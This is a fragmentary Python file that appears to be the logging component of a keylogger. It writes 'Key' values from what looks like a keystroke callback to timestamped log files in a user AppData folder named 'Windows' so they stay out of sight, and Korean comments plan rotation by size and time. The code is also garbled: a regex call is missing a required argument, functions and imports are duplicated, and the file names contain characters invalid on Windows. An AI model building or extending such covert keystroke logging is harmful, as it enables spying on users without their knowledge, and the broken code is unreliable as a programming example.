import re
from datetime import datetime
import os
import getpass
from datetime import datetime

username = getpass.getuser()

# interval == 30min,
# stdtime == 00:00:00
# if sometime == stdtime + 30min (00:30:00)
# then makedirs

now = datetime.now()
rename = re.sub(
    r'(?P<year>\d{4})-(?P<month>\d{2})-(?P<day>\d{2}), (?P=year)\.(?P=month)\.(?P=day)',
    '2018-07-28 2018.07.28')


rename = re.compile(r'(?P<yaer>\d{4})-(?P<month>\d{2})-(?P<day>\d{2})\.\d{6}')

def getLogFileName():
    now = datetime.now() # 2020-01-23 12:34:56.123456
    now = str(now).split(".")[0] # 2020-01-23 12:34:56
    filename = now + ".log"
    return filename

def getLogFilePath(fileName):
    dirpath = os.path.join("C:\\Users", username, "Appdata\\Roaming\\Windows")
    if not (os.path.isdir(dirpath)):
        os.makedirs(os.path.join(dirpath))
    filePath = os.path.join(dirpath, fileName)
    return filePath

def logThisFile(Key):
    Key = str(Key).replace("'", '')
    f = open(getLogFilePath(getLogFileName()), mode="at", encoding="utf-8")
    f.write(Key)



def detectfileSize():
    filesize = os.path.getsize(getLogFilePath(getLogFileName()))
    return filesize



def logThisFile(Key):
    Key = str(Key).replace("'", '')
    f = open(getLogFilePath(getLogFileName()), mode="at", encoding="utf-8")
    f.write(Key)

# 파일을 새로 만들어야 하는 경우 :
# 20kb가 넘었을 때, 파일 생성 시간이 기준시로부터 30분이 지나있을 때

def newmake(Key):
    Key = str(Key).replace("'", '')
    f = open(getLogFilePath(getLogFileName()), mode="at", encoding="utf-8")
    f.write(Key)